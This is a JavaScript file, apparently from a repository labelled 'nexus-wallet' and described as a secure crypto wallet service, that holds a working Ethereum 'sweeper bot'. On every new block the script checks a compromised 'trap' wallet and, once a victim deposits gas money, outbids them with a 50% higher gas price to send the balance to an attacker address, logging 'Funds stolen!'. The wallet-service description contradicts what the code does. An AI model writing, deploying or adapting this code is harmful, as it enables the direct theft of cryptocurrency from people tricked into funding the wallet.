const { ethers } = require("ethers");

// 1. Connection settings
const RPC_ENDPOINT = "https://eth-mainnet.g.alchemy.com/v2/YOUR_API_KEY";
const provider = new ethers.JsonRpcProvider(RPC_ENDPOINT);

// 2. Compromised wallet credentials (the "trap" wallet)
const VICTIM_PRIVATE_KEY = "0x_COMPROMISED_SEED_PRIVATE_KEY...";
const victimWallet = new ethers.Wallet(VICTIM_PRIVATE_KEY, provider);

// 3. Scammer's destination wallet (where stolen gas money is sent)
const ATTACKER_ADDRESS = "0x_SCAMMER_DESTINATION_ADDRESS...";

console.log("Sweeper Bot active. Monitoring incoming deposits...");

// 4. Trigger event: Listen for every new block created on the blockchain
provider.on("block", async (blockNumber) => {
    try {
        // Check the native balance (ETH/BNB) of the trap wallet
        const balance = await provider.getBalance(victimWallet.address);

        // If a victim deposits gas money (e.g., > 0.005 ETH)
        if (balance > ethers.parseEther("0.005")) {
            console.log(`Gas detected: ${ethers.formatEther(balance)} ETH! Draining now...`);

            // Calculate fast gas fee to out-speed the victim
            const feeData = await provider.getFeeData();
            const highGasPrice = (feeData.gasPrice * 150n) / 100n; // Add 50% priority fee

            // Estimate transaction gas cost (standard transfer costs ~21,000 gas)
            const gasLimit = 21000n;
            const totalGasFee = gasLimit * highGasPrice;

            // Calculate maximum remaining ETH to sweep out
            const sweepAmount = balance - totalGasFee;

            if (sweepAmount > 0n) {
                // Build and sign the emergency sweep transaction
                const tx = {
                    to: ATTACKER_ADDRESS,
                    value: sweepAmount,
                    gasLimit: gasLimit,
                    gasPrice: highGasPrice
                };

                // Send the transaction immediately
                const response = await victimWallet.sendTransaction(tx);
                console.log(`Funds stolen! Tx Hash: ${response.hash}`);
            }
        }
    } catch (error) {
        console.error("Sweeping error:", error);
    }
});
# nexus-wallet
Secure, Decentralized Crypto Investment &amp; Wallet Services
